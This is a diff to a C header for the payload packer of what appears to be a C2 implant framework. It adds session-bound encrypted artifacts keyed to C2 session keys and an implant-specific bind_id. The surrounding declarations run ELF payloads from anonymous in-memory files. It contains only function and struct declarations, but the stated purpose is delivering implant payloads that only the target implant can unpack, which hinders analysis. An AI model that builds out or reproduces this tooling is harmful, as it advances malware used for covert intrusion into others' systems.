@@ -45,9 +45,15 @@ extern "C" {
 #define PK_TAG_LEN     16
 #define PK_SHA_LEN     32
 #define PK_KEY_LEN     16
-#define PK_HDR_LEN     108   /* 8+4+4+8+8+16+12+16+32 */
+#define PK_HDR_LEN     108   /* v1: 8+4+4+8+8+16+12+16+32 */
+#define PK_BIND_ID_LEN 32
+#define PK_HDR_V2_LEN  140   /* v2: v1 头 + bind_id(32) */
 #define PK_VERSION     1
+#define PK_VERSION2    2     /* 会话绑定制品：bind_id 纳入 AAD */
 #define PK_FLAG_COMPRESSED 0x1u
+
+/* 会话绑定派生所需的密钥材料长度（对齐 02_c2 的 C2_KEY_LEN） */
+#define PK_SESSION_KEY_LEN 16
 
 /* LZSS 参数：距离字段 12 位，故最大距离 4095（不是 4096） */
 #define PK_LZSS_WINDOW   4096
@@ -68,6 +74,8 @@ extern "C" {
 #define PK_ERR_HASH     -8   /* 明文 SHA-256 不符 */
 #define PK_ERR_CORRUPT  -9   /* 压缩流损坏 */
 #define PK_ERR_SYS      -10  /* 系统调用失败 */
+#define PK_ERR_BIND     -11  /* 绑定标识不符（制品属于另一会话/植入体） */
+#define PK_ERR_DEGEN    -12  /* 密钥退化：k_c2s == k_s2c，拒绝派生 */
 
 typedef struct {
     uint32_t version;
@@ -78,6 +86,7 @@ typedef struct {
     uint8_t  iv[PK_IV_LEN];
     uint8_t  tag[PK_TAG_LEN];
     uint8_t  raw_sha[PK_SHA_LEN];
+    uint8_t  bind_id[PK_BIND_ID_LEN];  /* v2 起有效；v1 全零 */
 } pk_hdr;
 
 const char *pk_errstr(int e);
@@ -149,6 +158,62 @@ int pk_mexec(const uint8_t *elf, size_t len,
 
 /* 仅创建匿名内存文件并写入内容，返回 fd（>=0）或负错误码。 */
 int pk_memfd_write(const uint8_t *data, size_t len);
+
+/* ====================================================================
+ * 会话绑定（把制品与 C2 会话 / 植入体绑定）
+ * ====================================================================
+ *
+ * 目的：制品只在持有该会话密钥的一侧可解开，且不能在不同会话/植入体之间
+ *       互换（A 的制品搬到 B 上会被 bind_id 拒绝，而不是解出错误内容）。
+ *
+ * 不引入对 02_c2 的编译依赖：本层只吃原始密钥材料 + 不透明绑定上下文。
+ * 由调用方（或部署器）负责把 02_c2 的会话参数序列化成 bind_ctx。
+ *
+ *   seed    = HKDF-Extract(salt = bind_ctx,
+ *                          ikm  = k_c2s || k_s2c)
+ *             -> Expand(info = "dayanjing:packer:seed:v1", 32 字节)
+ *   bind_id = SHA-256("dayanjing:packer:bind:v1" || bind_ctx)
+ *
+ * 域分离：与 C2 通信密钥、洋葱层密钥使用不同 info 标签，互不推导。
+ */
+
+/*
+ * 从会话密钥派生打包种子。k_c2s / k_s2c 各 16 字节，bind_ctx 可为 NULL
+ * （ctx_len==0 表示无绑定上下文，安全性下降，仅用于测试）。
+ * k_c2s == k_s2c 时返回 PK_ERR_DEGEN 且不输出种子。
+ */
+int pk_session_seed(const uint8_t k_c2s[PK_SESSION_KEY_LEN],
+                    const uint8_t k_s2c[PK_SESSION_KEY_LEN],
+                    const uint8_t *bind_ctx, size_t bind_ctx_len,
+                    uint8_t seed[PK_SHA_LEN]);
+
+/* 计算绑定标识。bind_ctx 为 NULL 时按空上下文计算。 */
+int pk_bind_id(const uint8_t *bind_ctx, size_t bind_ctx_len,
+               uint8_t id[PK_BIND_ID_LEN]);
+
+/* 打包为 v2 会话绑定制品（头内含 bind_id，且 bind_id 纳入 AAD）。 */
+int pk_pack_session(const uint8_t *raw, size_t raw_len,
+                    const uint8_t k_c2s[PK_SESSION_KEY_LEN],
+                    const uint8_t k_s2c[PK_SESSION_KEY_LEN],
+                    const uint8_t *bind_ctx, size_t bind_ctx_len,
+                    uint8_t *out, size_t *out_len);
+
+/*
+ * 解包 v2 会话绑定制品。先比对 bind_id（不符返回 PK_ERR_BIND），再验签。
+ * 这样"制品被换成另一个会话的产物"能给出明确错误，而非笼统的 AUTH 失败。
+ */
+int pk_unpack_session(const uint8_t *blob, size_t blob_len,
+                      const uint8_t k_c2s[PK_SESSION_KEY_LEN],
+                      const uint8_t k_s2c[PK_SESSION_KEY_LEN],
+                      const uint8_t *bind_ctx, size_t bind_ctx_len,
+                      uint8_t *out, size_t *out_len);
+
+/* 从制品中取出 bind_id（v1 返回全零并正常返回 0）。 */
+int pk_artifact_bind_id(const uint8_t *blob, size_t blob_len,
+                        uint8_t id[PK_BIND_ID_LEN]);
+
+/* v2 制品尺寸上界（供分配缓冲）。 */
+size_t pk_size_bound_v2(size_t raw_len);
 
 #ifdef __cplusplus
 }
